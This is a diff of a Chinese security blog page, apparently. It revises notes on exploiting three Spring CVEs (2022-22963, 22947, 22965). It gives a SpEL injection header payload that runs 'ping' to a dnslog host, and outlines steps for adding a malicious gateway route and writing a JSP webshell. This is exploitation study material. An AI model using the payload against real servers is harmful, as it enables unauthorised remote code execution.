@@ -93,21 +93,28 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="Spring-Cloud-Function-SPEL表达式注入漏洞（CVE-2022-22963）"><a href="#Spring-Cloud-Function-SPEL表达式注入漏洞（CVE-2022-22963）" class="headerlink" title="Spring Cloud Function SPEL表达式注入漏洞（CVE-2022-22963）"></a>Spring Cloud Function SPEL表达式注入漏洞（CVE-2022-22963）</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本:"></a>版本:</h2><p>jdk: 1.8<br>spring-cloud &lt;&#x3D; 2021.0.1<br>3.0.0.RELEASE &lt;&#x3D; org.springframework.cloud &lt;&#x3D; 3.2.2<br>spring-cloud-function: 3.2.2<br>找依赖可以在这里：<a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a><br>Mac快捷键查看这个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liaowenxiong/article/details/120229246">https://blog.csdn.net/liaowenxiong/article/details/120229246</a></p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>参数头传入spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(“ping ******.dnslog.cn”)<br><img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/1.png" width="70%" height="70%" ><br>配合dnslog探测<br><img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/2.png" width="70%" height="70%" >  </p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><h2 id="x2F-x2F-TODO"><a href="#x2F-x2F-TODO" class="headerlink" title="&#x2F;&#x2F;TODO"></a>&#x2F;&#x2F;TODO</h2><h1 id="Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）"><a href="#Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）" class="headerlink" title="Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）"></a>Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Spring Cloud Gateway 是 Spring Cloud 下的一个项目，该项目是基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的网关，它旨在为微服务架构提供一种简单有效、统一的 API 路由管理方式。</p>
+        <h1 id="Spring-Cloud-Function-SPEL表达式注入漏洞（CVE-2022-22963）"><a href="#Spring-Cloud-Function-SPEL表达式注入漏洞（CVE-2022-22963）" class="headerlink" title="Spring Cloud Function SPEL表达式注入漏洞（CVE-2022-22963）"></a>Spring Cloud Function SPEL表达式注入漏洞（CVE-2022-22963）</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>&#x2F;&#x2F;TODO</p>
+<h2 id="版本"><a href="#版本" class="headerlink" title="版本:"></a>版本:</h2><p>jdk: 1.8<br>spring-cloud &lt;&#x3D; 2021.0.1<br>3.0.0.RELEASE &lt;&#x3D; org.springframework.cloud &lt;&#x3D; 3.2.2<br>spring-cloud-function: 3.2.2<br>找依赖可以在这里：<a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a><br>Mac快捷键查看这个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liaowenxiong/article/details/120229246">https://blog.csdn.net/liaowenxiong/article/details/120229246</a></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>参数头传入spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(“ping ******.dnslog.cn”)<br><img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/1.png" width="70%" height="70%" ><br>配合dnslog探测<br><img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/2.png" width="70%" height="70%" >  </p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="x2F-x2F-TODO"><a href="#x2F-x2F-TODO" class="headerlink" title="&#x2F;&#x2F;TODO"></a>&#x2F;&#x2F;TODO</h2><h1 id="Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）"><a href="#Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）" class="headerlink" title="Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）"></a>Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）</h1><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Spring Cloud Gateway 是 Spring Cloud 下的一个项目，该项目是基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的网关，它旨在为微服务架构提供一种简单有效、统一的 API 路由管理方式。</p>
 <h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud Gateway 3.1.x &lt; 3.1.1<br>Spring Cloud Gateway &lt; 3.0.7  </p>
-<h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><ul>
+<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
 <li>1.添加恶意路由(头需要声明Content-Type: application&#x2F;json)</li>
 <li>2.刷新路由，使用浏览器访问url抓包改请求类型即可（此刻已经执行恶意代码）</li>
 <li>3.查看路由记录的回显  <img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/3.png" width="70%" height="70%" ></li>
 </ul>
-<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>&#x2F;&#x2F;TODO</p>
+<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h2 id="x2F-x2F-TODO-1"><a href="#x2F-x2F-TODO-1" class="headerlink" title="&#x2F;&#x2F;TODO"></a>&#x2F;&#x2F;TODO</h2><h1 id="Spring远程命令执行漏洞（CVE-2022-22965）"><a href="#Spring远程命令执行漏洞（CVE-2022-22965）" class="headerlink" title="Spring远程命令执行漏洞（CVE-2022-22965）"></a>Spring远程命令执行漏洞（CVE-2022-22965）</h1><h2 id="基本介绍-2"><a href="#基本介绍-2" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>&#x2F;&#x2F;TODO</p>
+<h2 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h2><p>Spring Framework 5.3.x &lt; 5.3.18<br>Spring Framework 5.2.x &lt; 5.2.20</p>
+<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
+<li>1.发起恶意请求，写入jsp木马  </li>
+<li>2.远程命令执行  <img src="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/4.png" width="70%" height="70%" ></li>
+</ul>
+<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#x2F;&#x2F;TODO</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" data-id="clcfyso8v0006nahf144fdkzb" data-title="Spring Boot漏洞分析与利用" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/12/30/Spring-Boot%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" data-id="clcfz1ceh0005q2hfau8rbq0f" data-title="Spring Boot漏洞分析与利用" class="article-share-link">Share</a>
       
       
       
@@ -154,7 +161,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/" data-id="clcfyso8u0003nahfev17dmgm" data-title="Buuctf-Secret File" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/12/25/Buuctf-Secret-File/" data-id="clcfz1ceh0006q2hfcq4n8hda" data-title="Buuctf-Secret File" class="article-share-link">Share</a>
       
       
       
@@ -201,7 +208,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" data-id="clcfyso8u0004nahf0z06f6x9" data-title="CVE-2020-1472复现分析" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/12/23/CVE-2020-1472%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" data-id="clcfz1ceg0003q2hffezg0kaa" data-title="CVE-2020-1472复现分析" class="article-share-link">Share</a>
       
       
       
@@ -248,7 +255,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/" data-id="clcfyso8t0001nahf51zogi01" data-title="Bluetooth抓包分析初识" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/12/23/Bluetooth%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%86/" data-id="clcfz1cef0001q2hfc62taka9" data-title="Bluetooth抓包分析初识" class="article-share-link">Share</a>
       
       
       
@@ -300,7 +307,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/" data-id="clcfyso8w0008nahfdz9g4k3a" data-title="webpack前端源码还原漏洞" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/12/07/webpack%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E8%BF%98%E5%8E%9F%E6%BC%8F%E6%B4%9E/" data-id="clcfz1cei0009q2hf5qbea0uu" data-title="webpack前端源码还原漏洞" class="article-share-link">Share</a>
       
       
       
@@ -341,7 +348,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clcfyso8x000anahf798y6oc3" data-title="内存取证初识（一）" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/30/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="clcfz1cej000aq2hf0rbt2q3r" data-title="内存取证初识（一）" class="article-share-link">Share</a>
       
       
       
@@ -399,7 +406,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clcfyso8q0000nahf7hze8fln" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clcfz1ced0000q2hfbqdidn03" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
       
       
       
@@ -457,7 +464,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/" data-id="clcfyso8x0009nahfgwkqcw82" data-title="Weblogic内网渗透tips" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/24/Weblogic%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8Ftips/" data-id="clcfz1ceh0007q2hfhaeq9d2o" data-title="Weblogic内网渗透tips" class="article-share-link">Share</a>
       
       
       
@@ -503,7 +510,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="clcfyso8u0002nahfgf436ouh" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/22/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" data-id="clcfz1ceg0002q2hf7ybib5kq" data-title="BurpSuite插件开发" class="article-share-link">Share</a>
       
       
       
@@ -609,7 +616,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="clcfyso8v0005nahf1asqc230" data-title="Fastjson反序列化漏洞原理及(出/不出网)检测利用" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="clcfz1ceh0004q2hf9rzg6yt9" data-title="Fastjson反序列化漏洞原理及(出/不出网)检测利用" class="article-share-link">Share</a>
       
       
       
